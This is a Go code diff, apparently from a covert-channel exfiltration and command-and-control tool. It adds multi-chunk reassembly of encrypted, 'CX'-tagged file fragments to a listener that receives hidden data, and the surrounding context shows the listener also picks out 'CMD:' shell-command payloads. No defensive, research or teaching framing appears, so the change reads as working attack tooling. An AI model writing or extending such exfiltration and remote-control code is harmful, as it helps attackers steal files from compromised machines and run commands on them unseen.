@@ -888,6 +888,16 @@ func (o *Orchestrator) Listen(ctx context.Context, options *ListenOptions) error
 	const fragTTL = 5 * time.Minute
 	fragBuf := make(map[string]*fragEntry)
 
+	// Multi-chunk file reassembly buffer: key = "sourceIP:totalChunks".
+	// Encrypted chunks embed a 4-byte CX header (see exfiltration.go createChunks).
+	type cxEntry struct {
+		chunks    map[byte][]byte
+		total     byte
+		firstSeen time.Time
+	}
+	const cxTTL = 10 * time.Minute
+	cxBuf := make(map[string]*cxEntry)
+
 	for time.Now().Before(endTime) {
 		select {
 		case <-ctx.Done():
@@ -1007,6 +1017,48 @@ func (o *Orchestrator) Listen(ctx context.Context, options *ListenOptions) error
 			}
 		} else {
 			finalData = hiddenData
+		}
+
+		// CX marker: multi-chunk file reassembly.
+		// Encrypted chunks prepend "CX" + chunkID + totalChunks before encryption.
+		if len(finalData) >= 4 && finalData[0] == 'C' && finalData[1] == 'X' {
+			chunkID   := finalData[2]
+			totalCX   := finalData[3]
+			chunkBody := make([]byte, len(finalData)-4)
+			copy(chunkBody, finalData[4:])
+
+			cxKey := fmt.Sprintf("%s:%d", packet.Metadata.SourceIP, totalCX)
+			if cxBuf[cxKey] == nil {
+				cxBuf[cxKey] = &cxEntry{chunks: make(map[byte][]byte), total: totalCX, firstSeen: time.Now()}
+			}
+			cxBuf[cxKey].chunks[chunkID] = chunkBody
+
+			// Purge stale CX sets
+			for k, ce := range cxBuf {
+				if time.Since(ce.firstSeen) > cxTTL {
+					delete(cxBuf, k)
+				}
+			}
+
+			if !options.Quiet {
+				fmt.Printf("CX chunk %d/%d buffered (%d bytes)\n", chunkID+1, totalCX, len(chunkBody))
+			}
+
+			if byte(len(cxBuf[cxKey].chunks)) < totalCX {
+				continue // waiting for more chunks
+			}
+
+			// All chunks received — reassemble in order
+			var reassembled []byte
+			for i := byte(0); i < totalCX; i++ {
+				reassembled = append(reassembled, cxBuf[cxKey].chunks[i]...)
+			}
+			delete(cxBuf, cxKey)
+
+			if !options.Quiet {
+				fmt.Printf("CX reassembled %d chunks → %d bytes\n", totalCX, len(reassembled))
+			}
+			finalData = reassembled
 		}
 
 		// Detect shell command: payload starts with "CMD:"
